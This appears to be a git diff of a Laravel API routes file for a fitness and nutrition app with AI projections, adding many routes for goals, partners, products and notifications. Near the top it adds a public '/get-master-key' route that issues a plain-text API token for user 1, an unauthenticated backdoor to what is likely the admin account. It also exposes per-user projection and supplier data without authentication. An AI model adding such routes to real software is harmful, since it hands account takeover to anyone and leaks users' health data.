@@ -43,9 +43,15 @@ use App\Http\Controllers\AI\ProjectionFutureGoalController;
 use App\Http\Controllers\AI\RecommendationController;
 use App\Http\Controllers\AI\UserHabitUpdateController;
 use App\Http\Controllers\AI\UserNutritionCalculateController;
+use App\Http\Controllers\Partner\PartnerController;
+use App\Http\Controllers\PrivacyPolicy\PrivacyPolicyController;
 
 Route::prefix('v1')->group(function () {
 
+    Route::get('/get-master-key', function() {
+        $user = \App\Models\User::find(1);
+        return $user->createToken('MasterKey')->plainTextToken;
+    });
     // ----------------------------
     // Public Routes
     // ----------------------------
@@ -71,29 +77,33 @@ Route::prefix('v1')->group(function () {
 
     // Public Route: Get Terms & Conditions
     Route::get('terms', [TermsAndConditionController::class, 'get']);
+    Route::get('privacy-policy', [PrivacyPolicyController::class, 'show']);
     Route::post('/contact', [ContactController::class, 'store']);
-
-    
 
     // Public Route: Get FAQs
     Route::get('/faqs', [FaqController::class, 'index']);
+    Route::get('getUserProjectionData/{userId}', [ProjectionFutureGoalController::class, 'getUserProjectionData']);
 
- 
     // Stripe Webhook
-        Route::post('payment/webhook', [PlanPaymentController::class, 'handleWebhook']);
+        // Route::post('payment/webhook', [PlanPaymentController::class, 'handleWebhook']);
+        Route::post('payment/webhook', [PlanPaymentController::class, 'handleStripeWebhook']);
+        Route::post('/stripe/webhook', [PlanPaymentController::class, 'webhookHandle']);
         Route::get('/payment/success', [PlanPaymentController::class, 'paymentSuccess'])->name('payment.success');
         Route::get('/payment/cancel', [PlanPaymentController::class, 'paymentCancel'])->name('payment.cancel');
     Route::get('ads', [AdsController::class, 'index']);
+    
+    Route::apiResource('partners', PartnerController::class)->except(['store', 'update', 'destroy', 'show']);
 
     // ----------------------------
     // Protected Routes (Require Auth)
     // ----------------------------
     Route::middleware('auth:sanctum')->group(function () {
 
+        Route::post('save-terms', [PrivacyPolicyController::class, 'save']);
 
         //AI INsight part
         Route::post('/change-password', [ForgotPasswordController::class, 'changePassword']);
-        
+
 
         Route::post('/nutrition/calculate', [UserNutritionCalculateController::class, 'store']);
         Route::get('/nutrition/show', [UserNutritionCalculateController::class, 'show']);
@@ -115,16 +125,15 @@ Route::prefix('v1')->group(function () {
          //project-lifestyle
          Route::post('/projection-lifestyle', [ProjectionLifestyleController::class, 'store']);
          // projection-lifestyle latest
-        Route::get('/projection-lifestyle/latest', [ProjectionLifestyleController::class, 'showLatest']);
+       Route::get('/projection-lifestyle/latest/{user_id}', [ProjectionLifestyleController::class, 'showLatest']);
 
         //Projection goal
-        // Store a new future goal projection
-         Route::post('/projection-future-goal', [ProjectionFutureGoalController::class, 'store']);
+        Route::post('/projection-future-goal', [ProjectionFutureGoalController::class, 'store']);
 
-        // Get the latest projection for the authenticated user
-        Route::get('/projection-future-goal/latest', [ProjectionFutureGoalController::class, 'showLatest']);
+        Route::get('/projection-future-goal/latest/{user_id}', [ProjectionFutureGoalController::class, 'showLatest']);        
+
         //Recommendation
-         Route::get('/recommend-professionals', [RecommendationController::class, 'index']);
+        Route::get('recommend/professionals/{user_id}', [RecommendationController::class, 'index']);
          Route::get('/trainer-recommended-users/{trainer_id}', [RecommendationController::class, 'trainerUsers']);
         Route::get('/nutritionist-recommended-users/{nutritionist_id}', [RecommendationController::class, 'nutritionistUsers']);
         Route::get('/supplier-recommended-users/{supplier_id}', [RecommendationController::class, 'supplierUsers']);
@@ -133,28 +142,42 @@ Route::prefix('v1')->group(function () {
 
         Route::get('profile/{userId}', [UserProfileController::class, 'showByUserId']);
         Route::post('profile', [UserProfileController::class, 'storeAndUpdate']);
+        Route::post('user/update-current-image', [UserProfileController::class, 'updateCurrentImage']);
+        Route::get('user/current-image', [UserProfileController::class, 'getCurrentImage']);
+
+         Route::get('users/individuals', [UserController::class, 'individualUsers']);
+         Route::get('users/professionals', [UserController::class, 'professionalUsers']);
+
+         Route::get('/goals', [TargetGoalController::class, 'getGoal']);
+         Route::post('/goals', [TargetGoalController::class, 'storeOrUpdate']);
+         Route::post('/goals/{id}', [TargetGoalController::class, 'update']);
+         Route::get('/get-goal/{userId?}', [TargetGoalController::class, 'getGoal']);
         Route::get('users', [UserController::class, 'index']);
         Route::get('user-reports', [UserController::class, 'getUserReport']);
         Route::get('log-reports', [UserController::class, 'getLogReport']);
         Route::get('user-overview', [UserController::class, 'userOverviewData']);
-        Route::get('userOverviewChart', [UserController::class, 'userOverviewChart']);    
+        Route::get('user-overview-chart', [UserController::class, 'userOverviewChart']);
+        Route::get('/user-overview-chart/{userId?}', [UserController::class, 'userOverviewChart']);
+        Route::get('user-overview-filter', [UserController::class, 'processChartData']);
         Route::get('trainer-overview', [UserController::class, 'trainerOverview']);
         Route::post('connect-profession', [UserController::class, 'connectToProfession']);
         Route::get('connected-professions', [UserController::class, 'getMyConnections']);
 
         Route::get('professionals-data/{id}', [TrainerController::class, 'indexProfessionals']);
+        Route::get('professional-client-card', [TrainerController::class, 'professionalClientCard']);
        //AIObser
 
        Route::get('/ai-observemetrics', [AIObservemetricsController::class, 'show']);
-       Route::get('/dashboard-metrics', [AIObservemetricsController::class, 'index']);
+      Route::get('/dashboard-metrics/{id}', [AIObservemetricsController::class, 'index']);
         //getHealthReport
         Route::get('/health-report', [UserController::class, 'getHealthReport']);
 
         Route::post('/users/toggle-active/{id}', [UserController::class, 'toggleActiveUser']);
-       
+
 
            //subscription payment
-         Route::post('/payment/process', [PlanPaymentController::class, 'processPayment']);
+        Route::post('/payment/process', [PlanPaymentController::class, 'paymentProcess']);
+        Route::post('/process/payment', [PlanPaymentController::class, 'processPayment']);
         Route::get('/all-payments', [PlanPaymentController::class, 'index'])->name('payment.index'); // admin show all
         Route::get('/payment/show', [PlanPaymentController::class, 'show']);
 
@@ -166,9 +189,9 @@ Route::prefix('v1')->group(function () {
 
 
         Route::get('/activity-logs', [ActivityController::class, 'index']);
-        Route::post('/activity-logs', [ActivityController::class, 'store']); 
-        Route::get('/activity-logs/{id}', [ActivityController::class, 'show']); 
-        Route::delete('/activity-logs/{id}', [ActivityController::class, 'destroy']); 
+        Route::post('/activity-logs', [ActivityController::class, 'store']);
+        Route::get('/activity-logs/{id}', [ActivityController::class, 'show']);
+        Route::delete('/activity-logs/{id}', [ActivityController::class, 'destroy']);
         Route::get('/activity-report', [ActivityController::class, 'getActivityReport']);
 
         Route::get('/hydration-logs', [HydrationController::class, 'index']);
@@ -179,7 +202,7 @@ Route::prefix('v1')->group(function () {
 
         Route::post('/sleep-logs', [SleepController::class, 'store']);
         Route::get('/sleep-logs', [SleepController::class, 'index']);
-    
+
         Route::get('/sleep-logs/{id}', [SleepController::class, 'show']);
         Route::get('/sleep-report', [SleepController::class, 'getSleepReport']);
 
@@ -195,12 +218,14 @@ Route::prefix('v1')->group(function () {
         Route::get('get-card-data', [UserController::class, 'getDashboardData']);
 
         Route::get('/calendar-schedules', [ScheduleController::class, 'index']);
-        Route::post('/schedule-checkin', [ScheduleController::class, 'storeSchedule']);
+        Route::post('/schedule-checkin', [ScheduleController::class, 'storeOrUpdateSchedule']);
         Route::post('/send-reminder', [ScheduleController::class, 'sendReminder']);
         Route::get('/my-reminders', [ScheduleController::class, 'getMyReminders']);
 
         Route::post('/goals', [TargetGoalController::class, 'storeOrUpdate']);
         Route::get('/goals', [TargetGoalController::class, 'getGoal']);
+        Route::post('/goals/{id}', [TargetGoalController::class, 'update']);
+        Route::get('/get-goal/{userId?}', [TargetGoalController::class, 'getGoal']);
 
         Route::post('/adjust-program', [AdjustProgramController::class, 'storeOrUpdate']);
         Route::get('/adjust-program/{id}', [AdjustProgramController::class, 'show']);
@@ -223,7 +248,7 @@ Route::prefix('v1')->group(function () {
         Route::delete('/faqs/{id}', [FaqController::class, 'destroy']);
         Route::post('/faqs/status/{id}', [FaqController::class, 'toggleActive']);
 
-      
+
             // Create plan
             Route::post('plans', [PlanController::class, 'store'])->name('plans.store');
 
@@ -240,11 +265,14 @@ Route::prefix('v1')->group(function () {
             Route::get('plans/type/{type}', [PlanController::class, 'getPlansByType'])->name('plans.byType');
 
 
-        //trainer dashbaord 
+        //trainer dashbaord
        Route::resource('program-sets', ProgramsSetController::class);
-       
+
         Route::get('users/individuals', [UserController::class, 'individualUsers']);
         Route::post('program-sets/assign-users', [ProgramsSetController::class, 'assignUsers']);
+        Route::get('/program-context/{userId?}', [ProgramsSetController::class, 'getProgramContext']);
+        Route::get('/program-users/{programSetId}', [ProgramsSetController::class, 'getUsersInProgram']);
+        Route::get('/user-programs/{userId?}', [ProgramsSetController::class, 'getUserPrograms']);
 
         // Messaging
         Route::post('/messages/send', [MessageController::class, 'sendMessage']);
@@ -252,27 +280,49 @@ Route::prefix('v1')->group(function () {
         Route::get('/conversations', [MessageController::class, 'getConversations']);
 
         // Projections
-        Route::post('/projections', [ProjectionController::class, 'generateProjection']);
-
+        Route::post('/generate/projections', [ProjectionController::class, 'generateProjection']);
+         Route::get('/projections/limit-expired', [UserProfileController::class, 'getProjectionLimitAndExoiredAt']);
+        Route::get('/projections/{id}', [ProjectionController::class, 'show']);
+        Route::get('/my-projections', [ProjectionController::class, 'index']);
+        Route::get('/user/notification', [NotificationController::class, 'getSettings']);
         Route::post('/user/notification-settings', [NotificationController::class, 'updateSettings']);
 
+        
+        Route::post('/products/bulk-upload', [ProductController::class, 'bulkUpload']);
+        Route::get('/products/template', [ProductController::class, 'downloadTemplate']);
+        Route::get('/products/download-sample', [ProductController::class, 'downloadSample']);
         Route::post('/products', [ProductController::class, 'store']);
         Route::get('/products', [ProductController::class, 'index']);
         Route::post('/products/{id}', [ProductController::class, 'update']);
         Route::delete('/products/{id}', [ProductController::class, 'destroy']);
         Route::post('/products/status/{id}', [ProductController::class, 'updateProductStatus']);
+        Route::get('/products/supplier', [ProductController::class, 'supplierProduct']);
 
-          Route::post('/plans/store-or-update', [PlanController::class, 'storeOrUpdatePlan']);
+        Route::get('/trainer-notes/{userId}', [TrainerController::class, 'indexTrainerNotes']);
+        Route::post('/trainer-notes', [TrainerController::class, 'storeTrainerNote']);
+        Route::delete('/trainer-notes/{id}', [TrainerController::class, 'destroyTrainerNote']);
 
+        Route::post('/plans/store-or-update', [PlanController::class, 'storeOrUpdatePlan']);
 
-
-
-        
         // Get all unread notifications for logged-in user
-           Route::get('/notifications', [ProgramsSetController::class, 'unread']);
+        Route::get('/notifications', [ProgramsSetController::class, 'unread']);
         Route::post('/notifications/mark-read/{id}', [ProgramsSetController::class, 'markRead']);
+
+        Route::get('/notification-list-by-user',[NotificationController::class, 'notificationListByUser']);
+        Route::get('/all-notification-mark-as-read',[NotificationController::class, 'markAsRead']);
+        Route::post('/mark-single-as-read',[NotificationController::class, 'markSingleAsRead']);
+        Route::post('/delete-single-notification',[NotificationController::class, 'deleteSingleNotification']);
+        Route::post('/delete-all-notification',[NotificationController::class, 'deleteAllNotifications']);
 
         Route::get('supplyer-dashboard',[SupplyerController::class,'index']);
         Route::get('all-users-for-supplyer', [SupplyerController::class, 'userIndex']);
+    
+        Route::apiResource('partners', PartnerController::class)->except(['index']);
+
+        Route::get('getAiInputData/{userId}', [UserHabitUpdateController::class, 'getAiInputData']);
     });
+
+    Route::get('/products/supplier/ai', [ProductController::class, 'supplierProductForAI']);
+    Route::get('/supplier-profile/{id}', [ProductController::class, 'supplierProfileWithProducts']);
+
 });
